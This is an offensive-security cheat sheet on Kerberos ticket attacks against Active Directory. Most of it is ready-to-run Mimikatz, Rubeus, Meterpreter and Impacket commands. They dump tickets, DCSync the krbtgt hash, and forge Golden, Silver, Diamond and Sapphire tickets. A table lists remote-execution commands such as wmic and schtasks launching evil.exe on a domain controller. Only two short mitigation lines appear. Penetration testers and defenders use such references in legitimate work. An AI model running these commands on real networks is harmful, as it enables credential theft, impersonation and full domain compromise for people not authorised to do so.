# Kerberos - Tickets

Tickets are used to grant access to network resources. A ticket is a data structure that contains information about the user's identity, the network service or resource being accessed, and the permissions or privileges associated with that resource. Kerberos tickets have a limited lifetime and expire after a set period of time, typically 8 to 12 hours.

There are two types of tickets in Kerberos:

* **Ticket Granting Ticket** (TGT): The TGT is obtained by the user during the initial authentication process. It is used to request additional service tickets without requiring the user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an encryption of the user's secret key.

* **Service Ticket** (ST): The service ticket is used to access a specific network service or resource. The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption of the service's secret key.


## Dump Kerberos Tickets

* Mimikatz: `sekurlsa::tickets /export`
* Rubeus 
  ```ps1
  # List available tickets
  Rubeus.exe triage

  # Dump one ticket, the output is in Kirbi format
  Rubeus.exe dump /luid:0x12d1f7
  ```


## Replay Kerberos Tickets

* Mimikatz: `mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"`
* netexec: `KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache`


## Convert Kerberos Tickets

In the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential caches that are used to store Kerberos tickets.

* A credential cache, or `"ccache"` is a temporary storage area for Kerberos tickets that are obtained during the authentication process. The ccache contains the user's authentication credentials and is used to access network resources without having to re-enter the user's credentials for each request.

* The Kerberos Integrated Windows Authentication (KIWA) protocol used by Microsoft Windows systems also makes use of a credential cache called a `"kirbi"` cache. The kirbi cache is similar to the ccache used by standard Kerberos implementations, but with some differences in the way it is structured and managed.

While both caches serve the same basic purpose of storing Kerberos tickets to enable efficient access to network resources, they differ in format and structure. You can convert them easily using:

* kekeo: `misc::convert ccache ticket.kirbi`
* impacket: `impacket-ticketConverter SRV01.kirbi SRV01.ccache`


## Pass-the-Ticket Golden Tickets

Forging a TGT require:
* the `krbtgt` NT hash
* since recently, we cannot use a non-existent account name as a result of `CVE-2021-42287` mitigations

> The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.

### Using Mimikatz

```powershell
# Get info - Mimikatz
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt

# Forge a Golden ticket - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

### Using Meterpreter 

```powershell
# Get info - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

# Forge a Golden ticket - Meterpreter
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```

### Using a ticket on Linux

```powershell
# Convert the ticket kirbi to ccache with kekeo
misc::convert ccache ticket.kirbi

# Alternatively you can use ticketer from Impacket
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da

ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519

export KRB5CCNAME=/home/user/ticket.ccache
cat $KRB5CCNAME

# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
```

If you need to swap ticket between Windows and Linux, you need to convert them with `ticket_converter` or `kekeo`.

```powershell
root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi
root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```


Mitigations:

* Hard to detect because they are legit TGT tickets
* Mimikatz generate a golden ticket with a life-span of 10 years


## Pass-the-Ticket Silver Tickets

Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.

```powershell
# Create a ticket for the service
mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE

# Examples
mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park

# Then use the same steps as a Golden ticket
mimikatz $ misc::convert ccache ticket.kirbi

root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
```

Interesting services to target with a silver ticket :

| Service Type                                | Service Silver Tickets | Attack |
|---------------------------------------------|------------------------|--------|
| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
| PowerShell Remoting                         | CIFS + HTTP + (wsman?) | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |


Mitigations:

* Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.


## Pass-the-Ticket Diamond Tickets

> Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key

Requirements:

* krbtgt NT Hash
* krbtgt AES key

```ps1
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
```


## Pass-the-Ticket Sapphire Tickets

> Requesting the target user's PAC with `S4U2self+U2U` exchange during TGS-REQ(P) (PKINIT).

The goal is to mimic the PAC field as close as possible to a legitimate one.

Requirements:

* [Impacket PR#1411](https://github.com/SecureAuthCorp/impacket/pull/1411)
* krbtgt AES key

```ps1
# baduser argument will be ignored
ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
```


## References

* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
* [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)